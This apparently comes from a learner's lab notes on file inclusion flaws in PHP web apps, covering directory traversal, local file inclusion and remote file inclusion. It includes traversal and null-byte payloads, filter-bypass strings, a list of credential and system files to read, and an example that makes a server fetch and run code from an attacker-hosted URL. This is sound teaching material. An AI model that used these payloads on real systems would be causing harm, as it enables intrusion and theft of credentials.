# File inclusion

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters.

For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.
- An attacker can then change the `file=targetfile` to retrieve sensitive data

File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

3 ways to do File Inclusion attacks: 
- Directory traversal
- Local File Inclusion
- Remote File Inclusion

## Directory Traversal

Directory Traversal happens when the server does not check input data and then we can use `../` to traverse actual directories on the server: 
- for example: `http://webapp.thm/get.php?file=../../../../etc/passwd`

![28e648964eb12399f9fe91739e39040f.png](../../images/28e648964eb12399f9fe91739e39040f.png)

Important files we can access this way: 
- /etc/issue
- /etc/profile
- /proc/version
- /etc/passwd
- /etc/shadow
- /root/.bash_history
- /var/log/dmessage
- /var/mail/root
- /root/.ssh/id_rsa
- /var/log/apache2/access.log
- c:\boot.ini

### Local File Inclusion

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications.

1. Suppose the web application provides two languages, and the user can select between the EN and AR

```php
<?PHP 
    include($_GET["lang"]);
?>

```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page.The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php[](http://webapp.thm/index.php?lang=EN.php)to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.phpfiles exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd

2. Next, In the following code, the developer decided to specify the directory inside the function.

```php
<?PHP 
    include("languages/". $_GET['lang']); 
?>

```
    
In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.  

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd


3. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error

    Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12

  

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like: include(languages/THM.php);.

If you look at the directory closely, we can tell the function includes files in the languages directory is adding `.php` at the end of the entry. Thus the valid input will be something as follows: `index.php?lang=EN`, where the file EN is located inside the given languages directory and named `EN.php`.

Also, the error message disclosed another important piece of information about the full web application directory path which is `/var/www/html/THM-4/`

To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let's try the following:  

http://webapp.thm/index.php?lang=../../../../etc/passwd

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:  

    Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12

It seems we could move out of the PHP directory but still, the include function reads the input with `.php` at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the `NULL BYTE`, which is `%00`.  

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.  

By adding the Null Byte at the end of the payload, we tell the include function to ignore anything after the null byte which may look like:

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

4. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.

To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try /etc/passwd/.., it results to be /etc/ and that's because we moved one to the root.  Now if we try /etc/passwd/., the result will be /etc/passwdsince dot refers to the current directory.

5. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!  

http://webapp.thm/index.php?lang=../../../../etc/passwd  

We got the following error!  

    Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15

  
If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: `....//....//....//....//....//etc/passwd`

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

![dcdae25cb9764330e683b8863a372236.png](../../images/dcdae25cb9764330e683b8863a372236.png)

6. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.


### Remote File inclusion

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the `allow_url_fopen` option needs to be on.

  
The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.


##### RFI Steps

![27ce73a1b7803965bf07204a0b7140ed.png](../../images/27ce73a1b7803965bf07204a0b7140ed.png)


The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message Hello THM.

    <?PHP echo "Hello THM"; ?>

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.